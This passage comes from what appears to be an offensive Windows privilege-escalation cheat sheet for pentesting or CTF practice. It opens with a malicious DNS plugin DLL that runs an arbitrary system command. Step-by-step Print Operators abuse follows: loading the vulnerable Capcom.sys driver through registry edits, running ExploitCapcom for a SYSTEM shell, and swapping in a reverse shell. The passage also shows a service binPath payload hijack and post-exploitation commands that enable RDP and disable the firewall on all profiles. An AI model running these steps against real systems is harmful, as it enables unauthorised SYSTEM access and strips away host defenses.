DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}
```

### Print Operators

**Note this attack does not work after Windows 10 Version 1803 since you can't include references to registry keys under HKCU anymore**

Has the `SeLoadDriverPrivilege` which can be abused to elevate to SYSTEM. This might be blocked by UAC so check out the UACMe repo to bypass. With this privilege, we can use the driver `capcom.sys` to execute arbitrary shellcode as SYSTEM.

To load capcom, we can use this tool which enables the privilege and loads the capcom driver, but first we need to add the below headers to the top of the tool file. https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp

```
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

We can then compile this C++ tool with a Windows C++ compiler `cl.exe`:

```
C:\> cl.exe /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

Now download the `capcom.sys` driver from here: https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys and save it to a location.

Next we need to edit the registry to add the path of the capcom driver to be loaded:

```
C:\> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\PATH\TO\Capcom.sys"
C:\> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

Then load the driver:

```
C:\> EnableSeLoadDriverPrivilege.exe
```

\*\* All of the steps up until this point can be automated using EoPLoadDriver \*\*
- https://github.com/TarlogicSecurity/EoPLoadDriver/
- `.\EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\PATH\TO\Capcom.sys`

Finally, download https://github.com/tandasat/ExploitCapcom tool and compile with Visual Studio and run it for a SYSTEM shell. This will pop open a new shell in the GUI.
- If we do not have access to a GUI, then we can alter the followingf line in the ExploitCapcom.cpp file:
  ```
  TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
  ```
  to a reverse shell instead
  ```
  TCHAR CommandLine[] = TEXT("C:\\PATH\\TO\\REVSHELL.EXE");
  ```

Don't forget to clean up!

```
C:\> reg delete HKCU\System\CurrentControlSet\Capcom
```

If we need to verify the driver status at any point we can use the DriverView.exe tool from Nirsoft: http://www.nirsoft.net/utils/driverview.html (`.\DriverView.exe /stext drivers.txt; cat drivers.txt | findstr Capcom`).

### Server Operators

Effectively, members of this group are like Admins.

This grants you:
- `SeBackupPrivilege`
- `SeRestorePrivilege`
- Ability to manage and control Windows Services
    - Can use `PsService.exe` from SysinternalsSuite to check permissions on services by doing `.\PsService.exe security <SERVICE_NAME>`
    - For a vulnerable service running as SYSTEM that we have rights over, let's `sc config <SERVICE_NAME> binPath="<PAYLOAD>"` this and restart the service for SYSTEM execution



## Software Vulnerabilities

Some software have security defects (crazy). Some of these defects involve running tasks or starting services running with elevated privileges and do not perform checks to validate these actions. Can exploit by spawning cmd console with elevated privileges. Searchsploit on installed programs.


## Post Privesc

### Enable RDP

```
C:\> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f

C:\> netsh advfirewall set allprofiles state off
```